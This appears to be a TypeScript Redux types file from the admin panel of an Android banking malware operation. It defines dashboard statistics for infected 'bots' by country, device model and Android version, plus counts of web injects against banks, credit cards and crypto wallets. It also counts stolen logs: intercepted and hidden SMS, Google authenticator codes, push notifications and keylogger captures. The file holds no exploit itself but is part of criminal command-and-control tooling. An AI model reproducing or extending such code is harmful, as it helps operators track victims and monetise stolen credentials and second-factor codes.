import {BotLocation} from "../../Model/Bot";

export const FETCH_STATS = "FETCH_STATS";

export interface StatsBotsCountry {
    count: number,
    percent: number,
    country_code: string,
    country: string,
}

export interface BotTimeline {
    date: string,
    count: number,
}

export interface BotModelsStats {
    device: string,
    count: number,
}

export interface BotAndroidsStats {
    version: string,
    count: number,
}

export type OnlineBotMapStats = Record<string, BotLocation>;

interface StatsBots {
    counts: {
        total: number,
        totalToday: number,
        online: number,
        offline: number,
        permissionless: number,
        uninstalled: number,
        lastHour: number,
        lastDay: number,
        lastWeek: number,
        lastMonth: number,
    }
    countries: StatsBotsCountry[],
    timelines: BotTimeline[],
    models: BotModelsStats[],
    androids: BotAndroidsStats[],
    map: OnlineBotMapStats,
}

export interface LogTimeline {
    date: string,
    count: number,
    category: string,
}

interface StatsInjects {
    timelines: LogTimeline[],
    counts: {
        banks: number,
        credit_cards: number,
        stealers: number,
        crypt: number,
        shops: number,
        emails: number,
        wallets: number,
        sum: number,
    }
}

interface StatsLogs {
    timelines: LogTimeline[],
    counts: {
        smslist: number,
        hidesms: number,
        googleauth: number,
        otheraccounts: number,
        pushlist: number,
        keylogger: number,
        sum: number,
    }
}

export interface StatsState {
    isLoaded: boolean,
    bots: StatsBots,
    injects: StatsInjects,
    logs: StatsLogs,
}

export type GetStatsPayload = Omit<StatsState, "isLoaded">;

export interface GetStatsAction {
    type: typeof FETCH_STATS,
    payload: GetStatsPayload,
}


export type StatsActionTypes = GetStatsAction;
